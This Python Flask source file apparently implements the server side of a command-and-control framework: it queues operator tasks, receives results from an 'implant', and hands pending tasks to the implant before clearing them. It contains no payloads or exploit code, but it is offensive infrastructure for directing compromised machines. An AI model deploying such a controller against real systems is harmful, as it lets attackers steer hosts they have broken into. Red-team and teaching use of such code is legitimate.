import uuid
import json

from flask import request, Response
from flask_restful import Resource
from database.db import initialize_db
from database.models import Task, Result


class Tasks(Resource):
    # ListTasks
    def get(self):
        # Get all the task objects and return them to the user
        tasks = Task.objects().to_json()
        return Response(tasks, mimetype="application/json", status=200)

    # AddTasks
    def post(self):
        # Parse out the JSON body we want to add to the database
        body = request.get_json()
        json_obj = json.loads(json.dumps(body))
        # Get the number of Task objects in the request
        obj_num = len(body)
        # For each Task object, add it to the database
        for i in range(len(body)):
            # Add a task UUID to each task object for tracking
            json_obj[i]['task_id'] = str(uuid.uuid4())
            # Save Task object to database
            Task(**json_obj[i]).save()
            # Load the options provided for the task into an array for tracking in history
            task_options = []
            for key in json_obj[i].keys():
                # Anything that comes after task_type and task_id is treated as an option
                if (key != "task_type" and key != "task_id"):
                    task_options.append(key + ": " + json_obj[i][key])
        # Return the last Task objects that were added
        return Response(Task.objects.skip(Task.objects.count() - obj_num).to_json(),
                        mimetype="application/json",
                        status=200)

class Results(Resource):
    # ListResults
    def get(self):
        # Get all the result objects and return them to the user
        results = Result.objects().to_json()
        return Response(results, mimetype="application.json", status=200)

    # AddResults
    def post(self):
        # Check if results from the implant are populated
        if str(request.get_json()) != '{}':
            # Parse out the result JSON that we want to add to the database
            body = request.get_json()
            print("Received implant response: {}".format(body))
            json_obj = json.loads(json.dumps(body))
            # Add a result UUID to each result object for tracking
            json_obj['result_id'] = str(uuid.uuid4())
            Result(**json_obj).save()
            # Serve latest tasks to implant
            tasks = Task.objects().to_json()
            # Clear tasks so they don't execute twice
            Task.objects().delete()
            return Response(tasks, mimetype="application/json", status=200)
        else:
            # Serve latest tasks to implant
            tasks = Task.objects().to_json()
            # Clear tasks so they don't execute twice
            Task.objects().delete()
            return Response(tasks, mimetype="application/json", status=200)
